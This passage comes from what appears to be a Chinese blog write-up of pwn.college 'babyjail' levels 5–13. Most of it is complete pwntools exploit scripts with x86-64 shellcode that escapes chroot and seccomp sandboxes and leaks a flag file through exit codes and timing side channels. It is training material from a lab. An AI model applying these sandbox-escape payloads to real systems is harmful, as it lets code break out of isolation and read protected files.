lea r10,[rip+new_file]</span><br><span class="hljs-string">    xor r8,r8</span><br><span class="hljs-string">    mov rax,265</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //open(&quot;/a&quot;, 0, 0)</span><br><span class="hljs-string">    mov rbx,0x00000000612f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">//sendfile</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,128</span><br><span class="hljs-string">    mov eax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">//exit(42)</span><br><span class="hljs-string">    mov rdi,42</span><br><span class="hljs-string">    mov rax,0x3c</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">flag:</span><br><span class="hljs-string">    .string &quot;../../../../../flag&quot;</span><br><span class="hljs-string">new_file:</span><br><span class="hljs-string">    .string &quot;/a&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2><blockquote><p>int chdir(const char *path);</p><p>int fchdir(int fd);</p><p>都是更改当前目录，不过参数不同</p></blockquote><p><a href="https://blog.csdn.net/Dustinthewine/article/details/126694615">getcwd()、chdir()和 fchdir()函数的基本使用</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;.&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    //fchdir(int fd)</span><br><span class="hljs-string">    mov rdi,3</span><br><span class="hljs-string">    mov rax,81</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    //open(&quot;../../../../flag&quot;, 0, 0)</span><br><span class="hljs-string">    lea rdi,[rip+flag]</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,128</span><br><span class="hljs-string">    mov eax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,42</span><br><span class="hljs-string">    mov rax,0x3c</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">flag:</span><br><span class="hljs-string">    .string &quot;../../../../../flag&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2><blockquote><p>内核中只会记录一个chroot,所以第二次使用chroot的时候，并且不使用chdir就会出现第一关的问题，这个时候就可以越狱了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;.&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    //mkdir(&#x27;tmp&#x27;)</span><br><span class="hljs-string">    lea rdi,[rip+path]</span><br><span class="hljs-string">    mov rax,83</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //chroot(&#x27;tmp&#x27;)</span><br><span class="hljs-string">    lea rdi,[rip+path]</span><br><span class="hljs-string">    mov rax,161</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //open(&quot;../../../../flag&quot;, 0, 0)</span><br><span class="hljs-string">    lea rdi,[rip+flag]</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //sendfile</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,128</span><br><span class="hljs-string">    mov eax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //exit</span><br><span class="hljs-string">    mov rdi,42</span><br><span class="hljs-string">    mov rax,0x3c</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">flag:</span><br><span class="hljs-string">    .string &quot;../../../../../flag&quot;</span><br><span class="hljs-string">path:</span><br><span class="hljs-string">    .string &quot;tmp&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2><blockquote><p>使用子进程继承父进程文件描述符的特性，构造 level 3 的类似场景</p></blockquote><p>​直接使用 level3 的 openat 汇编代码，然后执行 <code>./a.out &lt; soulve.bin</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/&quot;</span>, O_RDONLY);<br>    assert(fd == <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> *path = <span class="hljs-string">&quot;/challenge/babyjail_level8&quot;</span>;<br>        <span class="hljs-type">char</span> *<span class="hljs-type">const</span> args[] = &#123;path, <span class="hljs-literal">NULL</span>&#125;;<br>        execve(path, args, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    close(fd);<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> level 9</h2><blockquote><p>采用 32 位的汇编来逃逸</p></blockquote><p>​这里需要从64位跳转到32位汇编，同天堂之门 <code>retf = pop eip;pop cs</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9]&quot;</span>)<br>binary_paths.append(<span class="hljs-string">&quot;.&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rsp, 0x133700c // 这里是重新开辟32位的栈空间，不影响现存代码即可，可以设置为0x1337060，超过当前汇编代码的存储位置。</span><br><span class="hljs-string">    call jmp32</span><br><span class="hljs-string">    //read</span><br><span class="hljs-string">    push 0x67   // 位置在 0x133700c</span><br><span class="hljs-string">    push 0x616c662f</span><br><span class="hljs-string">    mov ebx, esp</span><br><span class="hljs-string">    mov ecx, 0</span><br><span class="hljs-string">    mov eax, 5</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">    //write</span><br><span class="hljs-string">    mov ebx, 1</span><br><span class="hljs-string">    mov ecx, eax</span><br><span class="hljs-string">    mov edx, 0</span><br><span class="hljs-string">    mov esi, 0x3e8</span><br><span class="hljs-string">    mov eax, 0xbb</span><br><span class="hljs-string">    int 0x80</span><br><span class="hljs-string">jmp32:</span><br><span class="hljs-string">    mov dword ptr [rsp + 4], 0x23//cs = 0x23 为32位程序</span><br><span class="hljs-string">    retf</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode)<br>log.info(<span class="hljs-built_in">list</span>(payload))<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>​这里有个疑惑，就是 <code>rsp</code> 的设置问题。我这里测试设置为0x1337008-0x133700c都是可以的，但是设置完之后应该首先执行 [rsp + 4]的赋值，这个会打乱之后的push命令，按理来说不应该对啊，但是意外就是对了。目前搞不明白，调试的时候也会遇到跟天堂之门一样的问题，就是反编译不出来，pwndbg也不让我执行，就卡在这里了。</p><p>​同时尝试不设置 rsp 的栈，而是使用原先的栈空间，然后发现也是不行，必须得设置一个新的栈空间。</p><h2 id="level-10"><a class="markdownIt-Anchor" href="#level-10"></a> level 10</h2><blockquote><p>这里利用exit的返回值来泄露flag</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span><br>binary_paths.append(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi, 3</span><br><span class="hljs-string">    mov rsi, 0x1337100</span><br><span class="hljs-string">    mov rdx, 100</span><br><span class="hljs-string">    mov rax, 0// 这里读取 /flag到指定位置，文件描述符为3</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov dil, [0x1337100 + number]// 然后使用exit()会有返回值的特性来逐字节泄露读取的flag</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    r = process(binary_paths)<br>    new_shellcode = shellcode.replace(<span class="hljs-string">&quot;number&quot;</span>, <span class="hljs-built_in">str</span>(i))<br>    payload = asm(new_shellcode)<br>    r.send(payload)<br>    r.wait_for_close()<br>    flag += <span class="hljs-built_in">chr</span>(r.poll())<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(r.poll()) == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="level-11-12"><a class="markdownIt-Anchor" href="#level-11-12"></a> level 11-12</h2><blockquote><p>这里可以使用nanosleep来利用时间延时进行泄露，但是直接使用loop来循环认为制造时间延时也可以，而且更简便。对于level 12，只能使用read，那么延时也能泄露</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyjail_level[0-9][0-9]&quot;</span>)<br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span><br>binary_paths.append(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi, 3</span><br><span class="hljs-string">    mov rsi, 0x1337100</span><br><span class="hljs-string">    mov rdx, 100</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov dil, [0x1337100 + &#123;number&#125;]</span><br><span class="hljs-string">    cmp dil, &#123;char&#125;</span><br><span class="hljs-string">    jnz abort</span><br><span class="hljs-string"></span><br><span class="hljs-string">    loop:</span><br><span class="hljs-string">    jmp loop</span><br><span class="hljs-string">    abort:</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>r = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>,<span class="hljs-number">31</span>,-<span class="hljs-number">1</span>):<br>        new_shellcode = shellcode.<span class="hljs-built_in">format</span>(number = i, char = j)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(r, process): <span class="hljs-comment"># r与process类型相同</span><br>            r.kill()<br>        r = process(binary_paths)<br>        payload = asm(new_shellcode, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>        r.sendline(payload)<br>        t = Timeout(<span class="hljs-number">0.5</span>)<br>        timeout = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">with</span> t.countdown():<br>            <span class="hljs-keyword">while</span> t.timeout:<br>                <span class="hljs-keyword">if</span> r.poll() <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    timeout = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> timeout:<br>            <span class="hljs-keyword">continue</span><br>        flag += <span class="hljs-built_in">chr</span>(j)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i: %d, j: %d, flag: &#x27;%s&#x27;&quot;</span> % (i, j, flag))<br>    <span class="hljs-keyword">if</span> j == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> level 13</h2><blockquote><p>socketpair的应用</p></blockquote><h3 id="分析源码"><a class="markdownIt-Anchor" href="#分析源码"></a> 分析源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE 1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sendfile.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><br><span class="hljs-type">int</span> child_pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">(<span class="hljs-type">int</span> signal)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Time is up: terminating the child and parent!\n&quot;</span>);<br>    kill(child_pid, <span class="hljs-number">9</span>);<br>    kill(getpid(), <span class="hljs-number">9</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    assert(argc &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;###\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge will fork into a jail. Inside of the child process&#x27; jail, you will only be able to communicate with the&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;parent process. If you want the flag, you must convince the parent process to give it to you.\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">10000</span>; i++) close(i);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;connected: data written to one can be read from the other, and vice-versa.\n&quot;</span>);<br>    <span class="hljs-type">int</span> file_descriptors[<span class="hljs-number">2</span>];<br>    assert(socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, file_descriptors) == <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> parent_socket = file_descriptors[<span class="hljs-number">0</span>];<span class="hljs-comment">//parent 3</span><br>    <span class="hljs-type">int</span> child_socket = file_descriptors[<span class="hljs-number">1</span>];<span class="hljs-comment">//child 4</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The parent side of the socketpair is FD %d.\n&quot;</span>, parent_socket);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The child side of the socketpair is FD %d.\n&quot;</span>, child_socket);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Registering a cleanup function that will run 1 second from now and terminate both the parent and child.\n&quot;</span>);<br>    alarm(<span class="hljs-number">1</span>);<br>    signal(SIGALRM, cleanup);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Forking into a parent and child (sandbox) process.\n&quot;</span>);<br>    child_pid = fork();<br>    <span class="hljs-keyword">if</span> (!child_pid)<span class="hljs-comment">//child</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The child will now close itself off from the world, except for the child side of the 